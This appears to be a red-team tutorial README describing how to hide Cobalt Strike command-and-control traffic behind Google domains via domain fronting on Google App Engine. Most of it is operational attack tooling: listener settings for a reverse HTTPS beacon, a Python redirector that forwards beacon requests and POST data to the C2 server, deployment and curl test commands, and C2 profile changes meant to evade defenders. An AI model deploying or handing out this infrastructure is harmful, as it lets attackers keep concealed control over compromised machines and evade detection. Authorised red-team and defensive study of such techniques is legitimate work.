# Google-Domain-fronting
Domain fronting using Google app engine

Add the Cobalt Strike Listener

For this blog, we are going to assume using Cobalt strike as a C2 server, but this can be done with any Offensive infrastructure 
(Metasploit, Empire, Pupy, etc.).

First we are going to add our Cobalt Strike listener.

Use the “windows/beacon_https/reverse_https” listener
Set the Host value to the name of your appspot hostname
Set the port value to 443

![alt text](https://www.cyberark.com/wp-content/uploads/2017/07/GF-image-1.jpg)

Set the host list for tasks to the Google addresses we are fronting:

![alt text](http://www.cyberark.com/wp-content/uploads/2017/07/GF-image-2-1.jpg)

Deploy Your Google App Engine
Google app engine is a cloud platform which allows users to build and deploy custom web and mobile applications. It acts as an 
abstraction layer between the application and the cloud infrastructure.
We will use the Google App Engine as a redirector between our C2 server and compromised machine, using Google frontend domains to 
redirect requests destined to google.com domains:

![alt text](http://www.cyberark.com/wp-content/uploads/2017/07/GF-image-3.jpg)

Next, we need to deploy the code into Google App Engine ([Link](https://cloud.google.com/appengine/ "Google App Engine")). Assuming you 
have already created a project ([Link](https://www.securityartwork.es/2017/01/31/simple-domain-fronting-poc-with-gae-c2-server/ 
"Instructions")), create a new directory to store the project in.

'''
$. mkdir myproject
$. cd myproject
'''

You will have two files in this app engine directory: app.yaml and main.py. App.yaml should look like this:

'''
runtime: python27
api_version: 1
threadsafe: true
 
handlers:
- url: /.*
  script: main.app
'''

Main.py is available in this [Link](https://gist.github.com/redteam-cyberark/90fe4a3bc0caa582fc563ec503e5444c 
"gist"). There are a couple of blocks from the code to point out.

First, near the top is a variable to set as your CobaltStrike IP address or domain. There is no need to use a redirector, your 
CobaltStrike IP will be hidden from beacon endpoint analysis.

'''
# change to your Cobalt Strike IP 
cs_ip = &quot;MYCOBALTSTRIKE_IP&quot;
'''

Although it is possible to add a second redirector layer between Cobaltstrike and our Google App, it complicates the deployment without 
actually providing value to the red team. Only a Google employee should be able to view traffic from the GAE to the C2.

Next, the route table for the application, shown here, is very simple.

'''
app = webapp2.WSGIApplication([
    (r&quot;/(.+)&quot;, C2)
], debug=True)
'''

Any request including URI sent to the AppSpot domain will be sent on to CobaltStrike. This will not be ideal if you want to filter the 
requests based on User-Agent, originating IP, or URI. These are common deterrents against blue team members typically employed in a 
redirector.

The last thing to point out is the way the application handles a request sent. The handling of a POST and GET requests is given below.

'''
class CommandControl(webapp2.RequestHandler):
    def get(self, data):
        url = 'https://'+redirector+'/'+str(data)
        try:
            req = urllib2.Request(url)
            req.add_header('User-Agent',&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko&quot;)
            for key, value in self.request.headers.iteritems():
                req.add_header(str(key), str(value))
 
            resp = urllib2.urlopen(req)
            content = resp.read()
 
            self.response.write(content)
        except urllib2.URLError:
            &quot;Caught Exception, did nothing&quot;
# handle a POST request
    def post(self, data):
        url = 'https://'+redirector+'/'+str(data)
        try:
            req = urllib2.Request(url)
            req.add_header('User-Agent',&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko&quot;)
            for key, value in self.request.headers.iteritems():
                req.add_header(str(key), str(value))
 
            # this passes on the data from CB
            req.data = self.request.body
 
            resp = urllib2.urlopen(req)
            content = resp.read()
 
            self.response.write(content)
        except urllib2.URLError:
            &quot;Caught Exception, did nothing&quot;
'''

Notice that the request sent to the appspot application is sent on to the CobaltStrike instance. The application also makes sure to \
handle HTTP headers sent with the request and any data sent in the body of a POST request. This leaves the application generic enough to 
be used with different malleable C2 profiles.

Deploy the code:

'''
$. gcloud app deploy
'''

Verify the Redirector

After the code is deployed and the listener is setup, run a quick test to make sure everything is working. Open up the Web Log in CobaltStrike (View > Web Log) and send a cURL request to the GAE app:

'''
$. curl -i –H “Host: [appname].appengine.com” –user-agent “Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0)” https://mail.google.com/hi_there
 
...
'''

Verify the request shows up in the Web View logs. You should receive an empty 200 OK from the cURL request and a 404 in CobaltStrike.

![alt text](https://www.cyberark.com/wp-content/uploads/2017/07/GF-image-4.jpg)

The redirector is working!

Update Your Malleable C2 Profile

The last step is to setup the C2 profile. We have supplied a simple example here. It is a modified version of the [Link]
(https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/webbug.profile "Webbug Profile") created by @rsmudge.

There are a few important points to make about this profile:

Make sure to modify the ‘header “Host”’ line in both the http-get and http-post section. This should have your appengine name.
We do not need to add any certificate data to the profile. We are using Google’s HTTPS certificates in the beacon to application communication (woot!). From the application to the C2, HTTPS communication is proxied and not accessible from the beacon endpoint.
Not sure if it is required, but the metadata http-get section and the output section of http-post client/server is changed to use base64url. Netbios should also be suitable encoding.
Restart CobaltStrike with the new profile ready for use.

From now on, your beacon traffic should look like it’s going to www.google.com, mail.google.com or docs.google.com.
